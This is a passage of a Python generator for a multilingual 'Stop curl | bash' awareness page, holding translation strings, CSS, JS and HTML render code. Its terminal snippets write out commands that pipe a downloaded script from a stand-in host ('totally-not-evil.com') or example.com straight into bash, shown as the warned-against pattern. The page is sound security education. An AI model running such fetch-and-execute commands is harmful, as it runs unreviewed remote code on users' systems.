        "wild_h": "Cas réels", "alt_h": "Faites plutôt ça",
        "caveat": "Attention",
        "problem_intro": "Voici la commande en question :",
        "problem_body": "Elle télécharge un script shell depuis internet et l’exécute immédiatement. Vous ignorez ce qui tourne. Votre équipe aussi. Votre journal d’audit aussi.",
        "wild_lead": "Scripts d’installation réels, analysés en juin 2026. Ce ne sont pas des menaces hypothétiques.",
        "footer1": 'Inspiré par <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> et <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a>.',
        "footer2": "Partagez cette page la prochaine fois que quelqu’un colle un <code>curl | bash</code> dans le chat de votre équipe.",
    },
    "de": {
        "badge": "&#9888; Sicherheits-Antipattern",
        "tagline": "Ihr würdet den Code eines Fremden nicht ausführen, ohne ihn zu lesen. Trotzdem endet jede zweite Dokumentationsseite mit diesem Befehl.",
        "problem_h": "Das Problem", "why_h": "Warum es gefährlich ist",
        "wild_h": "Aus der Praxis", "alt_h": "Besser so machen",
        "caveat": "Hinweis",
        "problem_intro": "Um diesen Befehl geht es:",
        "problem_body": "Er lädt ein Shell-Skript aus dem Internet herunter und führt es sofort aus. Ihr habt keine Ahnung was läuft. Euer Team auch nicht. Euer Audit-Log auch nicht.",
        "wild_lead": "Echte Install-Skripte, analysiert im Juni 2026. Das sind keine hypothetischen Bedrohungen.",
        "footer1": 'Inspiriert von <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> und <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a>.',
        "footer2": "Teilt diese Seite, wenn jemand ein <code>curl | bash</code> in euren Team-Chat postet.",
    },
    "es": {
        "badge": "&#9888; Antipatrón de seguridad",
        "tagline": "No ejecutarías el código de un extraño sin leerlo. Sin embargo, cada segunda página de documentación termina con este comando.",
        "problem_h": "El problema", "why_h": "Por qué es peligroso",
        "wild_h": "Casos reales", "alt_h": "Haz esto en su lugar",
        "caveat": "Nota",
        "problem_intro": "Este es el comando en cuestión:",
        "problem_body": "Descarga un script de shell desde internet y lo ejecuta inmediatamente. No tienes idea de qué se ejecuta. Tu equipo tampoco. Tu registro de auditoría tampoco.",
        "wild_lead": "Scripts de instalación reales, analizados en junio de 2026. No son amenazas hipotéticas.",
        "footer1": 'Inspirado por <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> y <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a>.',
        "footer2": "Comparte esta página la próxima vez que alguien pegue un <code>curl | bash</code> en el chat de tu equipo.",
    },
    "pt": {
        "badge": "&#9888; Antipadrão de segurança",
        "tagline": "Você não executaria o código de um estranho sem ler. No entanto, cada segunda página de documentação termina com este comando.",
        "problem_h": "O problema", "why_h": "Por que é perigoso",
        "wild_h": "Casos reais", "alt_h": "Faça assim",
        "caveat": "Atenção",
        "problem_intro": "Este é o comando em questão:",
        "problem_body": "Ele baixa um script shell da internet e o executa imediatamente. Você não tem ideia do que roda. Sua equipe também não. Seu log de auditoria também não.",
        "wild_lead": "Scripts de instalação reais, analisados em junho de 2026. Não são ameaças hipotéticas.",
        "footer1": 'Inspirado por <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> e <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a>.',
        "footer2": "Compartilhe esta página na próxima vez que alguém colar um <code>curl | bash</code> no chat da equipe.",
    },
    "it": {
        "badge": "&#9888; Antipattern di sicurezza",
        "tagline": "Non eseguiresti il codice di uno sconosciuto senza leggerlo. Eppure, ogni seconda pagina di documentazione finisce con questo comando.",
        "problem_h": "Il problema", "why_h": "Perché è pericoloso",
        "wild_h": "Casi reali", "alt_h": "Fai così invece",
        "caveat": "Nota",
        "problem_intro": "Questo è il comando in questione:",
        "problem_body": "Scarica uno script shell da internet e lo esegue immediatamente. Non hai idea di cosa gira. Nemmeno il tuo team. Nemmeno il tuo log di audit.",
        "wild_lead": "Script di installazione reali, analizzati a giugno 2026. Non sono minacce ipotetiche.",
        "footer1": 'Ispirato da <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> e <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a>.',
        "footer2": "Condividi questa pagina la prossima volta che qualcuno incolla un <code>curl | bash</code> nella chat del team.",
    },
    "pl": {
        "badge": "&#9888; Antywzorzec bezpieczeństwa",
        "tagline": "Nie uruchomiłbyś kodu obcego bez jego przeczytania. A jednak co druga strona dokumentacji kończy się tym poleceniem.",
        "problem_h": "Problem", "why_h": "Dlaczego to niebezpieczne",
        "wild_h": "Z życia", "alt_h": "Zrób to zamiast tego",
        "caveat": "Uwaga",
        "problem_intro": "O tę komendę chodzi:",
        "problem_body": "Pobiera skrypt powłoki z internetu i natychmiast go wykonuje. Nie wiesz co się uruchamia. Twój zespół też nie. Twój dziennik audytu też nie.",
        "wild_lead": "Prawdziwe skrypty instalacyjne, przeanalizowane w czerwcu 2026. To nie są hipotetyczne zagrożenia.",
        "footer1": 'Zainspirowane przez <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> i <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a>.',
        "footer2": "Udostępnij tę stronę gdy ktoś wklei <code>curl | bash</code> na czacie zespołu.",
    },
    "tr": {
        "badge": "&#9888; Güvenlik Antipaterni",
        "tagline": "Bir yabancının kodunu okumadan çalıştırmazsınız. Yine de her ikinci dokümantasyon sayfası bu komutla bitiyor.",
        "problem_h": "Sorun", "why_h": "Neden tehlikeli",
        "wild_h": "Gerçek örnekler", "alt_h": "Bunun yerine yapılacaklar",
        "caveat": "Not",
        "problem_intro": "Söz konusu komut bu:",
        "problem_body": "İnternetten bir kabuk betiği indirip hemen çalıştırır. Ne çalıştığını bilmiyorsunuz. Ekibiniz de bilmiyor. Denetim günlüğünüz de.",
        "wild_lead": "Haziran 2026’da analiz edilen gerçek kurulum betikleri. Bunlar varsayımsal tehditler değil.",
        "footer1": '<a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> ve <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a> tarafından ilham alındı.',
        "footer2": "Ekip sohbetinize biri <code>curl | bash</code> yapıştırdığında bu sayfayı paylaşın.",
    },
    "zh-cn": {
        "badge": "&#9888; 安全反模式",
        "tagline": "你不会不读就运行陌生人的代码。然而，每隔一个文档页面都以这条命令结尾。",
        "problem_h": "问题所在", "why_h": "为什么危险",
        "wild_h": "真实案例", "alt_h": "正确做法",
        "caveat": "注意",
        "problem_intro": "就是这条命令：",
        "problem_body": "它从互联网下载一个 shell 脚本并立即执行。你不知道运行了什么。你的团队也不知道。你的审计日志也不知道。",
        "wild_lead": "2026年6月分析的真实安装脚本。这些不是假设性威胁。",
        "footer1": '受 <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> 和 <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a> 启发。',
        "footer2": "下次有人在团队聊天中粘贴 <code>curl | bash</code> 时，分享这个页面。",
    },
    "cs": {
        "badge": "&#9888; Bezpečnostní antipattern",
        "tagline": "Nespouštěli byste cizí kód bez přečtení. Přesto každá druhá stránka dokumentace končí tímto příkazem.",
        "problem_h": "Problém", "why_h": "Proč je to nebezpečné",
        "wild_h": "Z praxe", "alt_h": "Udělejte to takto",
        "caveat": "Poznámka",
        "problem_intro": "O tento příkaz jde:",
        "problem_body": "Stáhne shell skript z internetu a okamžitě ho spustí. Nevíte co běží. Váš tým také ne. Váš audit log také ne.",
        "wild_lead": "Skutečné instalační skripty, analyzované v červnu 2026. Nejsou to hypotetičné hrozby.",
        "footer1": 'Inspirováno <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> a <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a>.',
        "footer2": "Sdílejte tuto stránku příště, když někdo vloží <code>curl | bash</code> do týmového chatu.",
    },
}

EN_REASONS = LANGS["en"]["reasons"]
EN_WILD = LANGS["en"]["wild"]
EN_ALTS = LANGS["en"]["alts"]

TERM_PROBLEM = '''\
<div class="term">
  <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://totally-not-evil.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash</span>
</div>'''

TERM_PKG = '''\
<div class="term">
  <span class="cmt"># macOS</span><br>
  <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br><br>
  <span class="cmt"># Ubuntu / Debian</span><br>
  <span class="prompt">$ </span><span class="cmd">sudo apt install</span> <span class="url">sometool</span><br><br>
  <span class="cmt"># Node</span><br>
  <span class="prompt">$ </span><span class="cmd">npm install -g</span> <span class="url">sometool</span>
</div>'''

TERM_INSPECT = '''\
<div class="term">
  <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
  <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
  <span class="prompt">$ </span><span class="cmd">bash</span> <span class="url">install.sh</span>
</div>'''

TERM_LOG = '''\
<div class="term">
  <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
</div>'''

TERM_CHECKSUM = '''\
<div class="term">
  <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
  <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
  <span class="out">install.sh: OK</span><br>
  <span class="prompt">$ </span><span class="cmd">bash</span> <span class="url">install.sh</span>
</div>'''

TERMS = {"pkg": TERM_PKG, "inspect": TERM_INSPECT, "log": TERM_LOG, "checksum": TERM_CHECKSUM}

CSS = '''
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg: #ffffff; --surface: #f5f5f5; --text: #111111; --muted: #666666;
      --red: #cc2200; --red-bg: #fff0ee; --yellow: #7a5c00; --yellow-bg: #fffbea;
      --term-bg: #16161e; --term-text: #c0caf5; --term-comment: #565f89;
      --term-green: #9ece6a; --term-red: #f7768e; --term-yellow: #e0af68; --term-cyan: #7dcfff;
      --border: #e0e0e0; --radius: 6px;
    }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; font-size: 16px; }
    .lang-nav { background: var(--surface); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
    .lang-nav-inner { max-width: 720px; margin: 0 auto; padding: 8px 24px; display: flex; gap: 4px; overflow-x: auto; scrollbar-width: none; }
    .lang-nav-inner::-webkit-scrollbar { display: none; }
    .lang-btn { background: none; border: none; cursor: pointer; font-size: 12px; font-weight: 600; letter-spacing: 0.03em; color: var(--muted); padding: 4px 10px; border-radius: 4px; white-space: nowrap; transition: background 0.15s, color 0.15s; font-family: inherit; }
    .lang-btn:hover { background: var(--border); color: var(--text); }
    .lang-btn.active { background: var(--text); color: var(--bg); }
    .lang { display: none; }
    .lang.active { display: block; }
    .container { max-width: 720px; margin: 0 auto; padding: 0 24px; }
    header { border-bottom: 2px solid var(--text); padding: 56px 0 44px; }
    .badge { display: inline-flex; align-items: center; gap: 6px; background: var(--red-bg); border: 1.5px solid var(--red); color: var(--red); padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 24px; }
    h1 { font-size: clamp(2rem, 6vw, 3.2rem); font-weight: 800; line-height: 1.1; letter-spacing: -0.02em; margin-bottom: 18px; }
    h1 code { font-family: "SF Mono","Fira Code","Cascadia Code",monospace; background: var(--term-bg); color: var(--term-red); padding: 2px 10px; border-radius: 4px; font-size: 0.82em; }
    .tagline { font-size: 1.1rem; color: var(--muted); max-width: 540px; line-height: 1.65; }
    section { padding: 52px 0; border-bottom: 1px solid var(--border); }
    h2 { font-size: 0.75rem; font-weight: 700; letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); margin-bottom: 28px; }
    p { line-height: 1.65; }
    code { font-family: "SF Mono","Fira Code","Cascadia Code",monospace; font-size: 0.88em; background: var(--surface); padding: 1px 5px; border-radius: 3px; }
    .term { background: var(--term-bg); border-radius: var(--radius); padding: 20px 24px; font-family: "SF Mono","Fira Code","Cascadia Code","Courier New",monospace; font-size: 13.5px; line-height: 1.8; overflow-x: auto; margin: 20px 0; }
    .term .prompt { color: var(--term-green); user-select: none; }
    .term .cmd { color: var(--term-text); }
    .term .flag { color: var(--term-cyan); }
    .term .url { color: var(--term-yellow); }
    .term .pipe { color: var(--term-red); font-weight: bold; }
    .term .cmt { color: var(--term-comment); }
    .term .out { color: var(--term-comment); font-style: italic; }
    .reasons { list-style: none; display: flex; flex-direction: column; gap: 24px; margin-top: 8px; }
    .reasons li { display: grid; grid-template-columns: 36px 1fr; gap: 14px; align-items: start; }
    .reasons .icon { font-size: 1.3rem; padding-top: 2px; text-align: center; }
    .reasons .body strong { display: block; font-weight: 700; margin-bottom: 5px; }
    .reasons .body p { color: var(--muted); font-size: 0.93rem; }
    .examples { display: flex; flex-direction: column; gap: 12px; }
    .example { border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
    .example-header { background: var(--surface); padding: 9px 14px; font-size: 12.5px; font-weight: 600; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid var(--border); flex-wrap: wrap; }
    .example-header .tool { font-family: "SF Mono","Fira Code",monospace; font-weight: 400; color: var(--muted); margin-left: auto; font-size: 12px; }
    .example-body { padding: 12px 16px; font-size: 14px; color: var(--muted); line-height: 1.55; }
    .example-body strong { color: var(--text); }
    .tag { display: inline-block; padding: 2px 7px; border-radius: 3px; font-size: 10.5px; font-weight: 700; letter-spacing: 0.05em; text-transform: uppercase; }
    .tag.danger { background: var(--red-bg); color: var(--red); border: 1px solid #f5bdb3; }
    .tag.warn { background: var(--yellow-bg); color: var(--yellow); border: 1px solid #e8d48a; }
    .lead { color: var(--muted); font-size: 0.93rem; margin-bottom: 20px; }
    .alternatives { display: flex; flex-direction: column; gap: 32px; }
    .alt h3 { font-size: 1rem; font-weight: 700; margin-bottom: 6px; }
    .alt > p { font-size: 0.92rem; color: var(--muted); margin-bottom: 10px; }
    .callout { border-left: 3px solid; padding: 12px 16px; border-radius: 0 var(--radius) var(--radius) 0; margin-top: 12px; font-size: 0.88rem; line-height: 1.55; }
    .callout.warn { border-color: var(--yellow); background: var(--yellow-bg); color: var(--yellow); }
    .callout strong { display: block; margin-bottom: 3px; }
    footer { padding: 40px 0 48px; font-size: 0.85rem; color: var(--muted); line-height: 1.9; }
    footer a { color: var(--text); text-decoration: underline; text-underline-offset: 3px; }
    footer a:hover { color: var(--red); }
    @media (max-width: 480px) { header { padding: 36px 0 32px; } section { padding: 36px 0; } .example-header .tool { margin-left: 0; width: 100%; margin-top: 4px; } }
'''

JS = '''
const buttons = document.querySelectorAll('.lang-btn');
const panes = document.querySelectorAll('.lang');
function setLang(lang) {
  buttons.forEach(b => b.classList.toggle('active', b.dataset.lang === lang));
  panes.forEach(p => p.classList.toggle('active', p.id === 'lang-' + lang));
  history.replaceState(null, '', location.pathname + '#' + lang);
  document.documentElement.lang = lang;
}
buttons.forEach(btn => btn.addEventListener('click', () => setLang(btn.dataset.lang)));
const availLangs = [...buttons].map(b => b.dataset.lang);
const hashLang = location.hash.slice(1);
if (hashLang && availLangs.includes(hashLang)) {
  setLang(hashLang);
} else {
  const nav = (navigator.language || 'en').toLowerCase();
  const match = availLangs.find(l => nav === l || nav.startsWith(l + '-')) || 'en';
  setLang(match);
}
'''


def get(lang_code, key, fallback_lang="en"):
    if lang_code in LANGS and key in LANGS[lang_code]:
        return LANGS[lang_code][key]
    if lang_code in EXTRAS and key in EXTRAS[lang_code]:
        return EXTRAS[lang_code][key]
    return LANGS[fallback_lang].get(key, "")


def render_reasons(lang_code):
    reasons = get(lang_code, "reasons") or EN_REASONS
    parts = []
    for icon, title, desc in reasons:
        parts.append(f'''        <li>
          <span class="icon">{icon}</span>
          <div class="body">
            <strong>{title}</strong>
            <p>{desc}</p>
          </div>
        </li>''')
    return "\n".join(parts)


def render_wild(lang_code):
    wild = get(lang_code, "wild") or EN_WILD
    parts = []
    for t1cls, t1, t2cls, t2, tool, body in wild:
        parts.append(f'''        <div class="example">
          <div class="example-header">
            <span class="tag {t1cls}">{t1}</span>
            <span class="tag {t2cls}">{t2}</span>
            <span class="tool">{tool}</span>
          </div>
          <div class="example-body">{body}</div>
        </div>''')
    return "\n".join(parts)


def render_alts(lang_code):
    alts = get(lang_code, "alts") or EN_ALTS
    caveat = get(lang_code, "caveat") or "Caveat"
    parts = []
    for title, desc, term_key in alts:
        term = TERMS[term_key]
        extra = ""
        if term_key == "log":
            extra = f'''
          <div class="callout warn">
            <strong>{caveat}</strong>
            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won&#8217;t appear in the log.
          </div>'''
        parts.append(f'''        <div class="alt">
          <h3>{title}</h3>
          <p>{desc}</p>
          {term}{extra}
        </div>''')
    return "\n".join(parts)


def render_lang(lang_code):
    badge = get(lang_code, "badge")
    tagline = get(lang_code, "tagline")
    problem_h = get(lang_code, "problem_h")
    problem_intro = get(lang_code, "problem_intro")
    problem_body = get(lang_code, "problem_body")
    why_h = get(lang_code, "why_h")
    wild_h = get(lang_code, "wild_h")
    wild_lead = get(lang_code, "wild_lead")
    alt_h = get(lang_code, "alt_h")
    footer1 = get(lang_code, "footer1")
    footer2 = get(lang_code, "footer2")

    return f'''  <div class="lang" id="lang-{lang_code}">
    <div class="container">
      <header>
        <div class="badge">{badge}</div>
        <h1>Stop <code>curl | bash</code></h1>
        <p class="tagline">{tagline}</p>
      </header>

      <section>
        <h2>{problem_h}</h2>
        <p>{problem_intro}</p>
        {TERM_PROBLEM}
        <p>{problem_body}</p>
      </section>

      <section>
        <h2>{why_h}</h2>
        <ul class="reasons">
{render_reasons(lang_code)}
        </ul>
      </section>

      <section>
        <h2>{wild_h}</h2>
        <p class="lead">{wild_lead}</p>
        <div class="examples">
{render_wild(lang_code)}
        </div>
      </section>

      <section>
        <h2>{alt_h}</h2>
        <div class="alternatives">
{render_alts(lang_code)}
        </div>
      </section>

      <footer>
        <p>{footer1}</p>
        <p>{footer2}</p>
      </footer>
    </div>
  </div>'''


def build():
    nav_buttons = "\n    ".join(
        f'<button class="lang-btn" data-lang="{code}">{name}</button>'
        for code, name in LANG_NAMES.items()
    )

    lang_sections = "\n\n".join(
        render_lang(code) for code in LANG_NAMES
    )

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>No curl | bash &#8212; Don&#8217;t pipe the internet into your shell</title>
  <meta name="description" content="A reference page explaining why curl | bash is dangerous and what to do instead.">
  <style>
{CSS}  </style>
</head>
<body>

<nav class="lang-nav" aria-label="Language">
  <div class="lang-nav-inner">
    {nav_buttons}
  </div>
</nav>

{lang_sections}

<script>
{JS}
</script>
</body>
</html>
'''


if __name__ == "__main__":
    html = build()
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(html)
    print(f"Generated index.html ({len(html):,} bytes)")
